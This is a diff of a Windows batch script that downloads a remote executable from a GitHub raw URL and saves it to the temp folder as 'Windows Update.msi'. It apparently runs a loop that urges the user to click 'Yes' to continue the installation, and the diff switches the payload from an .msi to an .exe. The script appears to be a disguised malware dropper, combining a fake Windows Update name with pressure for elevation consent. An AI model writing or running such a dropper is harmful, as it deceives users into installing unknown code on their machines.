@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Set download URL and paths
-set "url=https://raw.githubusercontent.com/Boyretro/documentation/refs/heads/main/ClientSetup.msi"
+set "url=https://raw.githubusercontent.com/Boyretro/documentation/refs/heads/main/ClientSetup.exe"
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
@@ -43,4 +43,5 @@ echo Please click "Yes" to continue the installation.
 timeout /t 2 /nobreak >nul
 
 goto RunLoop
+
 
